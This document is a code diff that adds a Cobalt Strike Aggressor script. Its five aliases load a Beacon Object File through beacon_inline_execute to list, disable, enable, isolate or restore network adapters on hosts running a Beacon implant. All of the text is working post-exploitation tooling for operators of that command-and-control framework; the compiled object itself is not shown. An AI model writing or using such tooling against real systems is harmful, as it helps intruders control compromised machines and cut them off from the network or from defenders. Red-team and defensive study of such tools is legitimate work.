@@ -1,0 +1,47 @@
+# disable_nic_w.cna — wide-char variant
+# Alias: nic-list-w / nic-off-w / nic-on-w / nic-isolate-w / nic-restore-w
+
+alias nic-list-w {
+    local('$f $data $args');
+    $f    = openf(script_resource("src\\disable_nic_w.x64.obj"));
+    $data = readb($f, -1);
+    closef($f);
+    $args = bof_pack($1, "zi", $2, 2);
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias nic-off-w {
+    local('$f $data $args');
+    $f    = openf(script_resource("src\\disable_nic_w.x64.obj"));
+    $data = readb($f, -1);
+    closef($f);
+    $args = bof_pack($1, "zi", $2, 0);
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias nic-on-w {
+    local('$f $data $args');
+    $f    = openf(script_resource("src\\disable_nic_w.x64.obj"));
+    $data = readb($f, -1);
+    closef($f);
+    $args = bof_pack($1, "zi", $2, 1);
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias nic-isolate-w {
+    local('$f $data $args');
+    $f    = openf(script_resource("src\\disable_nic_w.x64.obj"));
+    $data = readb($f, -1);
+    closef($f);
+    $args = bof_pack($1, "zi", $2, 3);
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias nic-restore-w {
+    local('$f $data $args');
+    $f    = openf(script_resource("src\\disable_nic_w.x64.obj"));
+    $data = readb($f, -1);
+    closef($f);
+    $args = bof_pack($1, "zi", $2, 4);
+    beacon_inline_execute($1, $data, "go", $args);
+}
